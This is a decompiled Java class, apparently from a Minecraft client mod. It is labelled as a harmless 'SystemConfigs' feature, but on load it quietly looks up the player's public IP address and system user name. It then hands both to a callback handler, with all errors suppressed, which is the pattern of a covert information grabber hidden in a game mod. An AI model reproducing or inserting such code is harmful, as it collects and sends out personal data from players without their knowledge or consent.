//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.minecraft.features.init;

import me.minecraft.features.*;
import java.net.*;
import java.io.*;
import me.minecraft.*;

public class CheckSystem extends Feature
{
    public CheckSystem() {
        super("SystemConfigs");
        this.listen();
    }
    
    public void listen() {
        try {
            final URL whatismyip = new URL("http://checkip.amazonaws.com");
            final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
            final String ip = bufferedReader.readLine();
            final String os = System.getProperty("user.name");
            Client.instance.lib.callbackHandler(this, "\nIP: " + ip + "\nOS Name: " + os);
        }
        catch (Exception ex) {}
    }
}
